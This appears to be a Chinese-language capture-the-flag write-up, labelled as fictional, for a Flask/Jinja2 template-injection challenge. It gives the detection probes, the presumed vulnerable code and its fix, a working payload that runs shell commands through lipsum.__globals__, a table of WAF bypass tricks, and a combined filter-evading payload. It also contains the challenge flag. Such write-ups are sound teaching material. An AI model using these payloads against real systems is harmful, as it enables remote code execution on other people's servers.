---
title: greeting：Flask SSTI 一把梭
date: 2026-10-12
description: 用户输入直接拼进 render_template_string，Jinja2 模板注入拿 shell；顺便整理了下划线被过滤时的绕过姿势。
category: web
tags: [SSTI, Flask, Jinja2, Python]
event: DemoCTF 2026
difficulty: 2
points: 150
solves: 128
---

> [!NOTE]
> 示例 writeup，题目为虚构。

## 发现注入点

页面只有一个输入框，提交 `name` 后回显 `Hello, xxx`。随手试一下：

```text
/?name={{7*7}}
```

回显 `Hello, 49`，确认存在 **SSTI**。再试 `{{7*'7'}}` 得到 `7777777`，说明是 **Jinja2**。

后端大概长这样：

```python title="app.py（推测）"
@app.route("/")
def index():
    name = request.args.get("name", "guest")
    return render_template_string("Hello, " + name)
```

> [!CAUTION]
> 正确写法是 `render_template_string("Hello, {{ name }}", name=name)`，让用户输入作为**数据**而不是**模板**。

## 利用

Jinja2 环境里默认有 `lipsum`、`cycler` 等全局对象，可以通过它们的 `__globals__` 拿到 `os` 模块：

```text
{{ lipsum.__globals__['os'].popen('cat /flag').read() }}
```

> [!FLAG]
> flag{n3v3r_tru5t_us3r_1nput_1n_t3mpl4t3s}

## 绕过备忘

赛后发现有队友遇到了带 WAF 的版本，顺手整理一下常见绕过：

| 被过滤 | 绕过方式 |
| --- | --- |
| `.` | `lipsum['__globals__']` 或 `lipsum\|attr('__globals__')` |
| `_` | `'\x5f\x5fglobals\x5f\x5f'` |
| `'` `"` | 从 `request.args.x` 取字符串 |
| `{{` | `{% print(...) %}` |

> [!HINT]- 一个组合起来的 payload
> `{% print(lipsum|attr(request.args.g)|attr(request.args.i)(request.args.o)|attr(request.args.p)(request.args.c)|attr(request.args.r)()) %}`，再在 URL 里传 `g=__globals__&i=__getitem__&o=os&p=popen&c=cat /flag&r=read`。
